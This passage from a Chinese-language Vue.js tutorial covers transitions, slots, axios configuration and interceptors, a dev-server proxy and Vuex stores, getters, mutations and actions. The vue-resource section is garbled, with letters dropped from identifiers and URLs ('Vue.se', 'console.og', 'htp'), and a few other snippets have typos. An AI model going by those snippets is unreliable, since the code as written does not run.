> 3.在transition元素中添加enter-active-class/leave-active-class入场离场属性但是设置的值前面必须加上animated（当然也可以不在transition上设置animated，可以在你所要进行动画的标签上设置class属性为animated）
>
> 4.也可以加入:duration来统一设置入场和离场时候的时长



#### 案例



```java
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <script src="lib/vue.js"></script>
    <link rel="stylesheet" href="lib/animate.css">
</head>
<body>
    <div id="app">
        <input type="button" value="toggle" @click="flag=!flag">
        <!-- <transition enter-active-class="animated bounceIn" leave-active-class="animated bounceOut">
                <h3 v-if="flag">这是一个H3</h3>
        </transition> -->
        <transition enter-active-class="bounceIn" leave-active-class="bounceOut" :duration="400">
                <h3 v-if="flag" class="animated">这是一个H3</h3>
        </transition>
    </div>
    <script>
        var vm=new Vue({
            el:'#app',
            data:{
                flag:false
            },
            methods:{

            }
        })
    </script>
</body>
</html>
```





## 8.5：插槽



### 1.简介



让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。



### 2.分类



+ 默认插槽
+ 具名插槽
+ 作用域插槽



### 3.案例：默认插槽



```vue
父组件中：
        <Category>
           <div>html结构1</div>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot>插槽默认内容...</slot>
            </div>
        </template>
```



### 4.案例：具名插槽



```vue
父组件中：
        <Category>
            <template slot="center">
              <div>html结构1</div>
            </template>

            <template v-slot:footer>
               <div>html结构2</div>
            </template>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot name="center">插槽默认内容...</slot>
               <slot name="footer">插槽默认内容...</slot>
            </div>
        </template>
```



### 5.案例：作用域插槽



理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

具体编码：

```vue
父组件中：
		<Category>
			<template scope="scopeData">
				<!-- 生成的是ul列表 -->
				<ul>
					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
				</ul>
			</template>
		</Category>

		<Category>
			<template slot-scope="scopeData">
				<!-- 生成的是h4标题 -->
				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
			</template>
		</Category>
子组件中：
        <template>
            <div>
                <slot :games="games"></slot>
            </div>
        </template>
		
        <script>
            export default {
                name:'Category',
                props:['title'],
                //数据在子组件自身
                data() {
                    return {
                        games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                    }
                },
            }
        </script>
```



### 6.作用域



```java
<common-component :data="[1,2,3]">
    {{ data }}
    <!-- 
    这里的 `data` 会是 undefined，因为数组是 **传递给**  
    <common-component> 的而不是 在 <common-component> 组件
    **内部**定义的
    -->
</common-component >
```



> 父级模板里的所有内容都是在父级作用域中编译的；子模板里的所有内容都是在子作用域中编译的。

简单来说：你不能在写children的时候直接使用父级组件中的数据，考虑当前环境。

### 7.后备内容



在`<slot></slot>`标签中的内容将在没有匹配到插槽内容时渲染



```xml
 <slot>如果没有children，我就会渲染</slot>
```

如果父级模板中声明了插槽，但是应用组件却没有包裹任何内容，它便会渲染为备用内容。







## 8.6：axios





### 1.简介



Vue.js 1.0 我们常使用 vue-resource (官方ajax库), Vue 2.0 发布后作者宣告不再对 vue-resource 进行更新， 推荐我们使用 axios (基于 Promise 的 HTTP 请求客户端，可同时在浏览器和 node.js 中使用)



### 2.安装



```java
npm install --save axios
     -//或者
<script src="https://unpkg.com/axios/dist/axios.min.js"></script>     
```



### 3.axios API





+ 语法

```java
axios(config)
```

+ 案例

```java
// 发送 POST 请求
axios({
  method: 'post',
  url: '/user/12345',
  data: {
    firstName: 'Fred',
    lastName: 'Flintstone'
  }
});
//  GET 请求远程图片
axios({
  method:'get',
  url:'http://bit.ly/2mTM3nY',
  responseType:'stream'
})
  .then(function(response) {
  response.data.pipe(fs.createWriteStream('ada_lovelace.jpg'))
});
```



### 4.请求方法的别名



```c
axios.request(config)
axios.get(url[, config])
axios.delete(url[, config])
axios.head(url[, config])
axios.post(url[, data[, config]])
axios.put(url[, data[, config]])
axios.patch(url[, data[, config]])
```



### 5.请求配置项



下面是创建请求时可用的配置选项，注意只有 url 是必需的。如果没有指定 method，请求将默认使用 get 方法。

```java
{
  // `url` 是用于请求的服务器 URL
  url: "/user",

  // `method` 是创建请求时使用的方法
  method: "get", // 默认是 get

  // `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。
  // 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL
  baseURL: "https://some-domain.com/api/",

  // `transformRequest` 允许在向服务器发送前，修改请求数据
  // 只能用在 "PUT", "POST" 和 "PATCH" 这几个请求方法
  // 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream
  transformRequest: [function (data) {
    // 对 data 进行任意转换处理

    return data;
  }],

  // `transformResponse` 在传递给 then/catch 前，允许修改响应数据
  transformResponse: [function (data) {
    // 对 data 进行任意转换处理

    return data;
  }],

  // `headers` 是即将被发送的自定义请求头
  headers: {"X-Requested-With": "XMLHttpRequest"},

  // `params` 是即将与请求一起发送的 URL 参数
  // 必须是一个无格式对象(plain object)或 URLSearchParams 对象
  params: {
    ID: 12345
  },

  // `paramsSerializer` 是一个负责 `params` 序列化的函数
  // (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)
  paramsSerializer: function(params) {
    return Qs.stringify(params, {arrayFormat: "brackets"})
  },

  // `data` 是作为请求主体被发送的数据
  // 只适用于这些请求方法 "PUT", "POST", 和 "PATCH"
  // 在没有设置 `transformRequest` 时，必须是以下类型之一：
  // - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams
  // - 浏览器专属：FormData, File, Blob
  // - Node 专属： Stream
  data: {
    firstName: "Fred"
  },

  // `timeout` 指定请求超时的毫秒数(0 表示无超时时间)
  // 如果请求花费了超过 `timeout` 的时间，请求将被中断
  timeout: 1000,

  // `withCredentials` 表示跨域请求时是否需要使用凭证
  withCredentials: false, // 默认的

  // `adapter` 允许自定义处理请求，以使测试更轻松
  // 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).
  adapter: function (config) {
    /* ... */
  },

  // `auth` 表示应该使用 HTTP 基础验证，并提供凭据
  // 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` 设置的自定义 `Authorization`头
  auth: {
    username: "janedoe",
    password: "s00pers3cret"
  },

  // `responseType` 表示服务器响应的数据类型，可以是 "arraybuffer", "blob", "document", "json", "text", "stream"
  responseType: "json", // 默认的

  // `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称
  xsrfCookieName: "XSRF-TOKEN", // default

  // `xsrfHeaderName` 是承载 xsrf token 的值的 HTTP 头的名称
  xsrfHeaderName: "X-XSRF-TOKEN", // 默认的

  // `onUploadProgress` 允许为上传处理进度事件
  onUploadProgress: function (progressEvent) {
    // 对原生进度事件的处理
  },

  // `onDownloadProgress` 允许为下载处理进度事件
  onDownloadProgress: function (progressEvent) {
    // 对原生进度事件的处理
  },

  // `maxContentLength` 定义允许的响应内容的最大尺寸
  maxContentLength: 2000,

  // `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，promise 将被 resolve; 否则，promise 将被 rejecte
  validateStatus: function (status) {
    return status &gt;= 200 &amp;&amp; status &lt; 300; // 默认的
  },

  // `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目
  // 如果设置为0，将不会 follow 任何重定向
  maxRedirects: 5, // 默认的

  // `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。允许像这样配置选项：
  // `keepAlive` 默认没有启用
  httpAgent: new http.Agent({ keepAlive: true }),
  httpsAgent: new https.Agent({ keepAlive: true }),

  // "proxy" 定义代理服务器的主机名称和端口
  // `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据
  // 这将会设置一个 `Proxy-Authorization` 头，覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。
  proxy: {
    host: "127.0.0.1",
    port: 9000,
    auth: : {
      username: "mikeymike",
      password: "rapunz3l"
    }
  },

  // `cancelToken` 指定用于取消请求的 cancel token
  // （查看后面的 Cancellation 这节了解更多）
  cancelToken: new CancelToken(function (cancel) {
  })
}

```



### 6.响应结构



axios请求的响应包含以下信息：



````java
{
  // `data` 由服务器提供的响应
  data: {},
  // `status`  HTTP 状态码
  status: 200,
  // `statusText` 来自服务器响应的 HTTP 状态信息
  statusText: "OK",
  // `headers` 服务器响应的头
  headers: {},
  // `config` 是为请求提供的配置信息
  config: {}
}
````



使用 then 时，会接收下面这样的响应：

```java
axios.get("/user/12345")
  .then(function(response) {
    console.log(response.data);
    console.log(response.status);
    console.log(response.statusText);
    console.log(response.headers);
    console.log(response.config);
  });
```

在使用 `catch` 时，或传递 [rejection callback](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then) 作为 `then` 的第二个参数时，响应可以通过 `error` 对象可被使用。





### 7.配置的默认值



你可以指定将被用在各个请求的配置默认值。

全局的 axios 默认值：

```java
axios.defaults.baseURL = 'https://api.example.com';
axios.defaults.headers.common['Authorization'] = AUTH_TOKEN;
axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';
```

自定义实例默认值：

```java
// 创建实例时设置配置的默认值
var instance = axios.create({
  baseURL: 'https://api.example.com'
});

// 在实例已创建后修改默认值
instance.defaults.headers.common['Authorization'] = AUTH_TOKEN;
instance.get();
```





### 8.配置的优先顺序



配置会以一个优先顺序进行合并。这个顺序是：在 `lib/defaults.js` 找到的库的默认值，然后是实例的 `defaults` 属性，最后是请求的 config 参数。后者将优先于前者。这里是一个例子：

```java
// 使用由库提供的配置的默认值来创建实例
// 此时超时配置的默认值是 `0`
var instance = axios.create();

// 覆写库的超时默认值
// 现在，在超时前，所有请求都会等待 2.5 秒
instance.defaults.timeout = 2500;

// 为已知需要花费很长时间的请求覆写超时设置
instance.get('/longRequest', {
  timeout: 5000
});
```



### 9.拦截器



#### 配置拦截器



在请求或响应被 then 或 catch 处理前拦截它们。

```java
// 添加请求拦截器
axios.interceptors.request.use(function (config) {
    // 在发送请求之前做些什么
    return config;
  }, function (error) {
    // 对请求错误做些什么
    return Promise.reject(error);
  });

// 添加响应拦截器
axios.interceptors.response.use(function (response) {
    // 对响应数据做点什么
    return response;
  }, function (error) {
    // 对响应错误做点什么
    return Promise.reject(error);
  });
```



#### 移除拦截器



```java
var myInterceptor = axios.interceptors.request.use(function () {/*...*/});
axios.interceptors.request.eject(myInterceptor);
```



#### 附录(了解)



可以为自定义 axios 实例添加拦截器。

```java
var instance = axios.create();
instance.interceptors.request.use(function () {/*...*/});
```





### 10.错误处理



````java
axios.get('/user/12345')
  .catch(function (error) {
    if (error.response) {
      // 请求已发出，但服务器响应的状态码不在 2xx 范围内
      console.log(error.response.data);
      console.log(error.response.status);
      console.log(error.response.headers);
    } else {
      // Something happened in setting up the request that triggered an Error
      console.log('Error', error.message);
    }
    console.log(error.config);
  });
````



可以使用 validateStatus 配置选项定义一个自定义 HTTP 状态码的错误范围。

```java
axios.get('/user/12345', {
  validateStatus: function (status) {
    return status < 500; // 状态码在大于或等于500时才会 reject
  }
})
```



## 8.7：封装一个axios工具类



````java
import axios from 'axios'

// Content-Type 响应头
axios.defaults.headers['Content-Type'] = 'application/json;charset=utf-8'
// 创建axios实例
const service = axios.create({
  // axios中请求配置有baseURL选项，表示请求URL公共部分
  baseURL: process.env.VUE_APP_BASE_API,
  // 超时时间设置
  timeout: 10000,
  // true允许跨域
  withCredentials: true
})

// =====================================request拦截器=====================================
service.interceptors.request.use(config => {
  // 是否需要设置 token
  const isToken = (config.headers || {}).isToken === false
  if (getToken() && !isToken) {
    config.headers['Authorization'] = 'Bearer ' + getToken() // 让每个请求携带自定义token 请根据实际情况自行修改
  }
  // get请求映射params参数
  if (config.method === 'get' && config.params) {
    let url = config.url + '?' + tansParams(config.params);
    url = url.slice(0, -1);
    config.params = {};
    config.url = url;
  }
  return config
}, error => {
  console.log(error)
  Promise.reject(error)
})

// =====================================响应拦截器=====================================
service.interceptors.response.use(
  response => {
    // 如果返回的状态码为200，说明接口请求成功，可以正常拿到数据
    // 否则的话抛出错误
    if (response.status === 200) {
      return Promise.resolve(response)
    } else {
      return Promise.reject(response)
    }
  },
  // 服务器状态码不是2开头的的情况
  error => {
    if (error.response.status) {
      return Promise.reject(error.response)
    }
  }
)

/**
   * 封装get方法
   * @param url
   * @param data
   * @returns {Promise}
   */
export function get (url, params = {}, responseType = 'json') {
  return new Promise((resolve, reject) => {
    service.get(url, {
      params: params,
      responseType
    })
      .then(response => {
        resolve(response.data)
      })
      .catch(err => {
        reject(err)
      })
  })
}

/**
   * 封装post请求
   * @param url
   * @param data
   * @returns {Promise}
   */
export function post (url, data = {}) {
  return new Promise((resolve, reject) => {
    service.post(url, data)
      .then(response => {
        resolve(response.data)
      }, err => {
        reject(err)
      })
  })
}

/**
   * 封装delete请求
   * @param url
   * @param data
   * @returns {Promise}
   */
export function deletes (url, data = {}) {
  return new Promise((resolve, reject) => {
    service.delete(url, data)
      .then(response => {
        resolve(response.data)
      }, err => {
        reject(err)
      })
  })
}

/**
   * 封装put请求
   * @param url
   * @param data
   * @returns {Promise}
   */
export function put (url, data = {}) {
  return new Promise((resolve, reject) => {
    service.put(url, data)
      .then(response => {
        resolve(response.data)
      }, err => {
        reject(err)
      })
  })
}


export default service

````





## 8.8：vue-resour



### 1.简介



htps:/github.com/pagekit/vue-rsource/blo/devlop/docs/htp.md



### 2.安装



```java
npm instal vue-rsource -save
```



### 3.使用



```java
// 引入模块
import VueRsource from 'vue-rsource' // 使用插件
Vue.se(VueRsource)
// 通过 vue/组件对象发送 ajx 请求
this.$htp.get('/someUrl').then(response) => {
  // suces calback
  console.og(response.dat) //返回结果数据
}, (response) => {
  // ero calback
  console.og(response.tausText) //错误信息
})
```



### 4.api



vue-resource 提供了 7 种请求 API(REST 风格)：

```java
get(url, [options])
head(url, [options])
delete(url, [options])
jsonp(url, [options])
post(url, [body], [options])
put(url, [body], [options])
patch(url, [body], [options])
```



除了 jsonp 以外，另外 6 种的 API 名称是标准的 HTTP 方法。

+ options 参数说明:

| 参数        | 类型                           | 描述                                                         |
| :---------- | :----------------------------- | :----------------------------------------------------------- |
| url         | `string`                       | 请求的目标URL                                                |
| body        | `Object`, `FormData`, `string` | 作为请求体发送的数据                                         |
| headers     | `Object`                       | 作为请求头部发送的头部对象                                   |
| params      | `Object`                       | 作为URL参数的参数对象                                        |
| method      | `string`                       | HTTP方法 (例如GET，POST，...)                                |
| timeout     | `number`                       | 请求超时（单位：毫秒） (`0`表示永不超时)                     |
| before      | `function(request)`            | 在请求发送之前修改请求的回调函数                             |
| progress    | `function(event)`              | 用于处理上传进度的回调函数 ProgressEvent                     |
| credentials | `boolean`                      | 是否需要出示用于跨站点请求的凭据                             |
| emulateHTTP | `boolean`                      | 是否需要通过设置`X-HTTP-Method-Override`头部并且以传统POST方式发送PUT，PATCH和DELETE请求。 |
| emulateJSON | `boolean`                      | 设置请求体的类型为`application/x-www-form-urlencoded`        |

+ 通过如下属性和方法处理一个请求获取到的响应对象：

| 属性       | 类型                       | 描述                                                |
| :--------- | :------------------------- | :-------------------------------------------------- |
| url        | `string`                   | 响应的 URL 源                                       |
| body       | `Object`, `Blob`, `string` | 响应体数据                                          |
| headers    | `Header`                   | 请求头部对象                                        |
| ok         | `boolean`                  | 当 HTTP 响应码为 200 到 299 之间的数值时该值为 true |
| status     | `number`                   | HTTP 响应码                                         |
| statusText | `string`                   | HTTP 响应状态                                       |
| **方法**   | **类型**                   | **描述**                                            |
| text()     | `约定值`                   | 以字符串方式返回响应体                              |
| json()     | `约定值`                   | 以格式化后的 json 对象方式返回响应体                |
| blob()     | `约定值`                   | 以二进制 Blob 对象方式返回响应体                    |





## 8.9：跨域





### 1.方法一

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 **（优先匹配前端资源）**



### 2.方法二



​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。





# 九、Vuex



## 9.1：简介



### 1.概念



在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

Vuex 是一个专为 Vue.js 应用程序开发的**状态管理模式**。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。



### 2.什么是状态管理模式



让我们从一个简单的 Vue 计数应用开始：

```js
new Vue({
  // state
  data () {
    return {
      count: 0
    }
  },
  // view
  template: `
    <div>{{ count }}</div>
  `,
  // actions
  methods: {
    increment () {
      this.count++
    }
  }
})
```

这个状态自管理应用包含以下几个部分：

- **state**，驱动应用的数据源；
- **view**，以声明方式将 **state** 映射到视图；
- **actions**，响应在 **view** 上的用户输入导致的状态变化。

以下是一个表示“单向数据流”理念的简单示意：

<img src="images/flow-1642428519500.png" alt="image-20220117220856031" style="zoom:40%;" />

但是，当我们的应用遇到**多个组件共享状态**时，单向数据流的简洁性很容易被破坏：

- 多个视图依赖于同一状态。
- 来自不同视图的行为需要变更同一状态。

对于问题一，传参的方法对于多层嵌套的组件将会非常繁琐，并且对于兄弟组件间的状态传递无能为力。对于问题二，我们经常会采用父子组件直接引用或者通过事件来变更和同步状态的多份拷贝。以上的这些模式非常脆弱，通常会导致无法维护的代码。

因此，我们为什么不把组件的共享状态抽取出来，以一个全局单例模式管理呢？在这种模式下，我们的组件树构成了一个巨大的“视图”，不管在树的哪个位置，任何组件都能获取状态或者触发行为！

通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且易维护。

这就是 Vuex 背后的基本思想，借鉴了 [Flux (opens new window)](https://facebook.github.io/flux/docs/overview)、[Redux (opens new window)](http://redux.js.org/)和 [The Elm Architecture (opens new window)](https://guide.elm-lang.org/architecture/)。与其他模式不同的是，Vuex 是专门为 Vue.js 设计的状态管理库，以利用 Vue.js 的细粒度数据响应机制来进行高效的状态更新。

如果你想交互式地学习 Vuex，可以看这个 [Scrimba 上的 Vuex 课程 (opens new window)](https://scrimba.com/g/gvuex)，它将录屏和代码试验场混合在了一起，你可以随时暂停并尝试。

<img src="images/vuex.png" alt="image-20220117220856031" style="zoom:40%;" />

### 3.何时使用？



​		多个组件需要共享数据时

Vuex 可以帮助我们管理共享状态，并附带了更多的概念和框架。这需要对短期和长期效益进行权衡。

如果您不打算开发大型单页应用，使用 Vuex 可能是繁琐冗余的。确实是如此——如果您的应用够简单，您最好不要使用 Vuex。一个简单的 [store 模式 (opens new window)](https://cn.vuejs.org/v2/guide/state-management.html#简单状态管理起步使用)就足够您所需了。但是，如果您需要构建一个中大型单页应用，您很可能会考虑如何更好地在组件外部管理状态，Vuex 将会成为自然而然的选择。引用 Redux 的作者 Dan Abramov 的话说就是：

> Flux 架构就像眼镜：您自会知道什么时候需要它。



### 4.原理图



<img src="images/vuex.png" alt="image-20220117220856031" style="zoom:60%;" />





## 9.2：案例-vue版计数



### 1.代码



````java
<template>
  <div>
    <h1>当前求和：{{ count }}</h1>
    <select class="btn" v-bind:value="n">
      <option v-for="(index) in 5" :key="index">{{ index }}</option>
    </select><br>
    <button class="btn btn-default" @click="increment">加</button>
    <button class="btn btn-default" @click="decrement">减</button>
    <button class="btn btn-default" @click="incrementodd">当为基数加</button>
    <button class="btn btn-default" @click="incrementwait">等一等再加</button>
  </div>

</template>

<script>
export default {
  name: "Count",
  data() {
    return {
      count: 0,
      n: 1
    }
  }, methods: {
    increment() {
      this.count+=this.n
    },
    decrement() {
      this.count-=this.n
    },
    incrementodd() {
      if (this.count%2===0){
        this.count+=this.n
      }
    },
    incrementwait() {
      setTimeout(()=>{
        this.count+=this.n
      },500)
    },
  }
}
</script>

<style scoped>

</style>
````



### 2.测试



<img src="images/image-20220117223215499.png" alt="image-20220117223215499" style="zoom:80%;" />



## 9.3：安装vuex



```java
npm install vuex --save
```



```java
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)
```



<img src="images/image-20220117224133085.png" alt="image-20220117224133085" style="zoom:80%;" />



## 9.4：搭建vuex环境



### 1.创建文件：src/store/index.js



   ```js
//该文件用于创建vuex中最为核心的store

//引入Vue和Vuex
import Vue from 'vue'
import Vuex from "vuex";
Vue.use(Vuex)
//准备 actions----用于相应组件中的动作
const actions ={}

//准备 mutations----用于操作数据(CRUD)
const mutations ={}

//准备 state----用于控制数据的状态
const state ={}

//创建并暴露store
export default  new Vuex.Store({
    actions,
    mutations,
    state
})



   ```



### 2.在main.js中创建vm时传入store配置项



  

   ```js
import Vue from 'vue'
import App from './App.vue'
import store from './store/index'
Vue.config.productionTip = false
new Vue({
    render: h => h(App),
    store,
}).$mount('#app')
   ```





## 9.5：案例-Vux版技术(第一版)



### 1.store/index.js



```java
//该文件用于创建vuex中最为核心的store
//引入Vue和Vuex
import Vue from 'vue'
import Vuex from "vuex";
Vue.use(Vuex)
//准备 actions----用于相应组件中的动作
const actions ={
     jia(context,value){
        console.log('actions中的jia被调用了')
        context.commit('JIAmutations',value)
    },
    jian(context,value){
        console.log('actions中的jian被调用了')
        context.commit('JIANmutations',value)
    },
    jiaOdd(context,value){
        console.log('actions中的jiaOdd被调用了')
        if(context.state.sum % 2){
            context.commit('JIAmutations',value)
        }
    },
    jiaWait(context,value){
        console.log('actions中的jiaWait被调用了')
        setTimeout(()=>{
            context.commit('JIAmutations',value)
        },500)
    }
}

//准备 mutations----用于操作数据(CRUD)
const mutations ={
    JIAmutations(state,value){
        console.log('mutations中的JIA被调用了')
        state.sum += value
    },
    JIANmutations(state,value){
        console.log('mutations中的JIAN被调用了')
        state.sum -= value
    }

}

//准备 state----用于控制数据的状态
const state ={
    sum:1000
}

//创建并暴露store
export default  new Vuex.Store({
    actions,
    mutations,
    state
})
```



### 2.Count.vue



```java
<template>
  <div>
    <h1>当前求和：{{ $store.state.sum }}</h1>
    <select class="btn" v-bind:value="n">
      <option v-for="(index) in 5" :key="index">{{ index }}</option>
    </select><br>
    <button class="btn btn-default" @click="increment">加</button>
    <button class="btn btn-default" @click="decrement">减</button>
    <button class="btn btn-default" @click="incrementodd">当为基数加</button>
    <button class="btn btn-default" @click="incrementwait">等一等再加</button>
  </div>
</template>
<script>
export default {
  name: "Count",
  data() {
    return {
      n: 1
    }
  }, methods: {
    increment() {
     this.$store.dispatch('jia',this.n)
    },
    decrement() {
      this.$store.dispatch('jian',this.n)
    },
    incrementodd() {
     this.$store.dispatch('jiaOdd',this.n)
    },
    incrementwait() {
        this.$store.dispatch('jiaWait',this.n)
    },
  }
}
</script>
<style scoped>
</style>
```



### 3.测试

<img src="images/image-20220117231313257.png" alt="image-20220117231313257" style="zoom:80%;" />

看打印信息



## 9.6：案例-Vux版技术(第二版)



### 1.store/index.js



不变



### 2.count.vue



```java
<template>
//*************************省略***********************
</template>

<script>
export default {
  name: "Count",
  data() {
    return {
      n: 1
    }
  }, methods: {
    increment() {
     this.$store.commit('JIAmutations',this.n)
    },
    decrement() {
      this.$store.commit('JIANmutations',this.n)
    },
    incrementodd() {
     this.$store.dispatch('jiaOdd',this.n)
    },
    incrementwait() {
        this.$store.dispatch('jiaWait',this.n)
    },
  }
}
</script>
```





### 3.测试



<img src="images/image-20220117231646174.png" alt="image-20220117231646174" style="zoom:80%;" />

### 4.总结



为什么：看图：我们是不是直接dispatch去调用actions了，但是actions是不是去cmmit了mutation它，这个时候我们可以直接跨过它的

<img src="images/vuex.png" alt="image-20220117220856031" style="zoom:60%;" />



## 9.7：Getters配置项



### 1.简介



有时候我们需要从 store 中的 state 中派生出一些状态，例如对列表进行过滤并计数：

```java
computed: {
  doneTodosCount () {
    return this.$store.state.todos.filter(todo => todo.done).length
  }
}
```

**如果有多个组件需要用到此属性，我们要么复制这个函数，或者抽取到一个共享函数然后在多处导入它——无论哪种方式都不是很理想。**

Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。

Getter 接受 state 作为其第一个参数：

```java
onst store = new Vuex.Store({
  state: {
    todos: [
      { id: 1, text: '...', done: true },
      { id: 2, text: '...', done: false }
    ]
  },
  getters: {
    doneTodos: state => {
      return state.todos.filter(todo => todo.done)
    }
  }
})
```



### 2.通过属性访问



Getter 会暴露为 `store.getters` 对象，你可以以属性的形式访问这些值：

```js
store.getters.doneTodos // -> [{ id: 1, text: '...', done: true }]
```

Getter 也可以接受其他 getter 作为第二个参数：

```js
getters: {
  // ...
  doneTodosCount: (state, getters) => {
    return getters.doneTodos.length
  }
}
store.getters.doneTodosCount // -> 1
```

我们可以很容易地在任何组件中使用它：

```js
computed: {
  doneTodosCount () {
    return this.$store.getters.doneTodosCount
  }
}
```

注意，getter 在通过属性访问时是作为 Vue 的响应式系统的一部分缓存其中的。



### 3.通过方法访问



你也可以通过让 getter 返回一个函数，来实现给 getter 传参。在你对 store 里的数组进行查询时非常有用。

```js
getters: {
  // ...
  getTodoById: (state) => (id) => {
    return state.todos.find(todo => todo.id === id)
  }
}
```



```java
store.getters.getTodoById(2) // -> { id: 2, text: '...', done: false }
```



注意，getter 在通过方法访问时，每次都会去进行调用，而不会缓存结果。



### 4.总结



1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```



## 9.8：state配置项



和我们的data属性很像这里就是存储我们的数据

+ 取值

```java
$store.state.XXX
```



## 9.9：Mutation配置项



### 1.简介



更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 **事件类型 (type)** 和 一个 **回调函数 (handler)**。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 **state** 作为第一个参数：

```js
const store = new Vuex.Store({
  state: {
    count: 1
  },
  mutations: {
    increment (state) {
      // 变更状态
      state.count++
    }
  }
})
```

你不能直接调用一个 mutation handler。这个选项更像是事件注册：“当触发一个类型为 `increment` 的 mutation 时，调用此函数。”要唤醒一个 mutation handler，你需要以相应的 type 调用 **store.commit** 方法：

```js
this.$store.commit('increment')
```



### 2.提交负载(如何调用)



> 第一种：



你可以向 `store.commit` 传入额外的参数，即 mutation 的 **载荷（payload）**：

```js
// ...
mutations: {
  increment (state, n) {
    state.count += n
  }
}
```

+ 调用

```java
store.commit('increment', 10)
```



> 第二种：



在大多数情况下，载荷应该是一个对象，这样可以包含多个字段并且记录的 mutation 会更易读：

```js
// ...
mutations: {
  increment (state, payload) {
    state.count += payload.amount
  }
}

```

+ 调用

```java
store.commit('increment', {
  amount: 10
})
```



### 3.Mutation 必须是同步函数



一条重要的原则就是要记住 **mutation 必须是同步函数**。为什么？请参考下面的例子：

```js
mutations: {
  someMutation (state) {
    api.callAsyncMethod(() => {
      state.count++
    })
  }
}
```

现在想象，我们正在 debug 一个 app 并且观察 devtool 中的 mutation 日志。每一条 mutation 被记录，devtools 都需要捕捉到前一状态和后一状态的快照。然而，在上面的例子中 mutation 中的异步函数中的回调让这不可能完成：**因为当 mutation 触发的时候，回调函数还没有被调用，devtools 不知道什么时候回调函数实际上被调用——实质上任何在回调函数中进行的状态的改变都是不可追踪的。**



### 4.在组件中提交 Mutation



```java
this.$store.commit('JIANmutations',this.n)
// 任何由 "JIANmutations" 导致的状态变更都应该在此刻完成。
```





## 9.10：Action



### 1.简介



Action 类似于 mutation，不同在于：

- Action 提交的是 mutation，而不是直接变更状态。
- Action 可以包含任意异步操作。

让我们来注册一个简单的 action：

```java
const store = new Vuex.Store({
  state: {
    count: 0
  },
  mutations: {
    increment (state) {
      state.count++
    }
  },
  actions: {
    increment (context) {
      context.commit('increment')
    }
  }
})
```



### 2.提示



Action 函数接受一个与 store 实例具有相同方法和属性的 context 对象，因此你可以调用 `context.commit` 提交一个 mutation，或者通过 `context.state` 和 `context.getters` 来获取 state 和 getters。





### 3.分发 Action



Action 通过 `store.dispatch` 方法触发：

```js
this.$store.dispatch('increment')
```

乍一眼看上去感觉多此一举，我们直接分发 mutation 岂不更方便？实际上并非如此，还记得 **mutation 必须同步执行**这个限制么？Action 就不受约束！我们可以在 action 内部执行**异步**操作：

```js
actions: {
  incrementAsync ({ commit }) {
    setTimeout(() => {
      commit('increment')
